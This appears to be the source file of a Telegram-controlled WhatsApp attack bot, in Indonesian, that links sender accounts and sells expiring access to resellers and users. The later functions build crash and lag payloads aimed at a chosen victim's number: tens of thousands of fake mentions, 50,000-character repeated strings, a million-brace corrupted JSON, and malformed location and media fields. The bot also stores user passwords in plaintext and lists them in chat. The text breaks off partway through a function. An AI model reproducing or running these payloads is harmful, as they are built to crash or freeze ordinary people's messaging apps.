const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./database/userStore.js");

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
app.use(cookieParser());
const userPath = path.join(__dirname, "./database/user.json");


const USAGE_LIMIT_FILE = "./database/usageLimit.json";

function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    } else {
      return {};
    }
  } catch (e) {
    return {};
  }
}

function saveUsageLimit(data) {
  fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify(data, null, 2));
}

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isReseller(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "reseller" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Xaa;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ataa = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ataa);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ataa.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ataa = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ataa.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ataa);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ataa.requestPairingCode(BotNumber, "OVERLOAD");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ataa.ev.on("creds.update", saveCreds);
  return Ataa;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.magenta(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣾⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⣾⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⣠⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║   ${chalk.bgBlackBright.bold(' Zklol - System Aktif  ')}.  ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`))
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to Zklol Settings!*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/adduser   → Create User  
/address   → Create Reseller  
/addadmin  → Create Admin  
/addowner  → Create Owner  
/edituser  → Change User  
/extend    → Extend Expired  
/listuser  → Reveal All Active Users  
/deluser   → Remove User  
/connect   → Bind Your Bot Session  
/listsender → Trace Active Sender  
/delsender  → Purge Sender Identity

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/@Alpooooooofoluv" }
        ]
      ]
    }
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});


bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Reseller tidak bisa menghapus user Admin.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("address", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menambahkan Reseller.");
  if (args.length !== 4) return ctx.reply("Format: /address Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "reseller" });
  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``
  
  return ctx.reply(
    `✅ Reseller berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delress", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menghapus Reseller.");
  if (args.length !== 2) return ctx.reply("Format: /delress username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "reseller") return ctx.reply(`⚠️ *${username}* bukan reseller.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Reseller *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambahkan Admin.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /addadmin Username Password Durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({
    username,
    password,
    expired,
    role: "admin",
    telegram_id: userId
  });

  saveUsers(users);

  const functionCode = `
  🧬 WEB LOGIN : \`http://${VPS}:${PORT}\``;

  return ctx.reply(
    `✅ Admin berhasil ditambahkan:\n👤 *${username}*\n🔑 *${password}*\n📅 Exp: ${new Date(expired).toLocaleString("id-ID")}\n${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus Admin.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deladmin <username>");
  }

  const username = args[1];
  let users = getUsers();
  const target = users.find(u => u.username === username && u.role === "admin");

  if (!target) {
    return ctx.reply(`❌ Admin *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users = users.filter(u => u.username !== username);
  saveUsers(users);

  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:\n\n`;
  users.forEach((user) => {
    if (!isOwnerUser && user.role === "admin") return; // Admin tidak boleh lihat owner
    text += `👤 *${user.username}*\n🔑 ${user.password}\n📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}\n🎖️ Role: ${user.role}\n\n`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});

bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa mengedit user.");
  }

  if (args.length < 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  if (!["user", "reseller", "admin", "owner"].includes(role)) {
    return ctx.reply(`⚠️ Role hanya bisa: User, Reseller, Admin.`, { parse_mode: "Markdown" });
  }

  if (role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  users[index] = {
    ...users[index],
    password,
    expired: Date.now() + parseInt(durasi) * 86400000,
    role
  };

  saveUsers(users);
  return ctx.reply(`✅ User *${username}* berhasil diperbarui.`, { parse_mode: "Markdown" });
});

bot.command("extend", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa memperpanjang masa aktif.");
  }

  const args = ctx.message.text.split(" ");
  if (args.length !== 3) return ctx.reply("Format: /extend Username Durasi");

  const [_, username, durasi] = args;
  const days = parseInt(durasi);
  if (isNaN(days) || days <= 0) return ctx.reply("❌ Durasi harus berupa angka lebih dari 0.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin") return ctx.reply("⛔ Tidak bisa memperpanjang masa aktif untuk user role admin.");

  const now = Date.now();
  const base = users[index].expired > now ? users[index].expired : now;
  users[index].expired = base + (days * 86400000);

  saveUsers(users);
  ctx.reply(`✅ Masa aktif *${username}* berhasil diperpanjang hingga ${new Date(users[index].expired).toLocaleString("id-ID")}`, { parse_mode: "Markdown" });
});

// -------------------( ANDRO FUNC )------------------------------
async function XProtexDelay(target, mention) {
  console.log(chalk.red(`Succes Sending Bug Delay By XProtex To ${target}`))
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(target, message, {});

  await Ataa.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  const zap = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "⎋ 🦠</🧬⃟༑⌁⃰𝙊𝙑𝙀𝙍𝙇𝙊𝘼𝘿-𝙓" + "ោ៝".repeat(50000),
    title: "☆",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "ZrMId" + Math.floor(Math.random() * 99999999999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(50000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 600000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              zap
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await Ataa.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: tmsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function OtaxCrashInvisible(otax, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await Ataa.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("OTAX CRASH BERHASIL DIKIRIM"));
}

const VaxzyXx = JSON.stringify({
  status: true,
  criador: "VerloadXApiBug",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VerloadForceDelMsg(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "Hi I'm Overload!!" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
